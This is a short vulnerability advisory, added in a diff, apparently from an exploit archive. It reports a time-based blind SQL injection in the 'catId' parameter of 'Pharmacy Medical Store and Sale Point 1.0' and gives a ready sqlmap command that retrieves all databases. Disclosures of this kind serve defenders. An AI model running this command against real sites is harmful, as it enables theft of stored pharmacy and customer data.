@@ -1,0 +1,13 @@
+# Title: Pharmacy Medical Store and Sale Point 1.0  - 'catid' SQL Injection
+# Exploit Author: Moaaz Taha (0xStorm)
+# Date: 2020-08-18
+# Vendor Homepage: https://www.sourcecodester.com/php/14398/pharmacymedical-store-sale-point-using-phpmysql-bootstrap-framework.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14398&title=Pharmacy%2FMedical+Store+%26+Sale+Point+Using+PHP%2FMySQL+with+Bootstrap+Framework
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 3.2.4
+
+# Description
+This parameter "catId" is vulnerable to Time-Based blind SQL injection in this path "/medical/inventeries.php?catID=1" that leads to retrieve all databases.
+
+#POC
+sqlmap -u "http://TARGET/medical/inventeries.php?catID=1" -p catId --dbms=mysql --threads=10
